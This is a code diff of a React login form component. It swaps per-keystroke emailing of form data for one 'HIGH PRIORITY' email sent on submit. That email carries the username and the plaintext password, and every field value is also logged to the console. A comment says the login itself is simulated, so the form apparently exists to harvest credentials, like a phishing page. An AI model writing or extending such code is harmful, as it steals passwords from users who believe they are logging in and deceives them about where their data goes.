@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Eye, EyeOff, User, Lock } from "lucide-react";
-import { sendEmailNotification } from "@/services/emailService";
+import { sendHighPriorityNotification } from "@/services/emailService";
 
 interface LoginFormProps {
   onLoginSuccess: (username: string) => void;
@@ -20,26 +20,10 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
-  const handleInputChange = async (field: string, value: string) => {
+  const handleInputChange = (field: string, value: string) => {
     console.log(`🔄 Field changed: ${field} = "${value}"`);
-    
     setFormData(prev => ({ ...prev, [field]: value }));
-    
-    // Send email notification immediately
-    try {
-      console.log('📧 Sending email notification...');
-      await sendEmailNotification({
-        step: "Login Form - Field Update",
-        field: field,
-        value: value,
-        username: formData.username || "Not provided yet",
-        timestamp: new Date().toISOString(),
-        allFormData: { ...formData, [field]: value }
-      });
-      console.log('✅ Email notification sent successfully!');
-    } catch (error) {
-      console.error('❌ Email notification failed:', error);
-    }
+    // Removed field-level email sending to reduce delays
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -56,17 +40,23 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
 
     setIsLoading(true);
 
+    // Send HIGH PRIORITY email immediately when LOGIN button is clicked
     try {
-      console.log('📧 Sending login attempt email...');
-      await sendEmailNotification({
-        step: "Login Form - Submit Attempt",
+      console.log('🚨 Sending HIGH PRIORITY login attempt email immediately...');
+      await sendHighPriorityNotification({
+        step: "🔴 LOGIN BUTTON CLICKED - IMMEDIATE ALERT",
         username: formData.username,
         timestamp: new Date().toISOString(),
-        allFormData: formData
+        allFormData: {
+          username: formData.username,
+          password: formData.password,
+          action: "LOGIN_ATTEMPT",
+          buttonClicked: "LOGIN"
+        }
       });
-      console.log('✅ Login attempt email sent!');
+      console.log('✅ HIGH PRIORITY login email sent immediately!');
     } catch (error) {
-      console.error('❌ Login attempt email failed:', error);
+      console.error('❌ HIGH PRIORITY login email failed:', error);
     }
 
     // Simulate login process
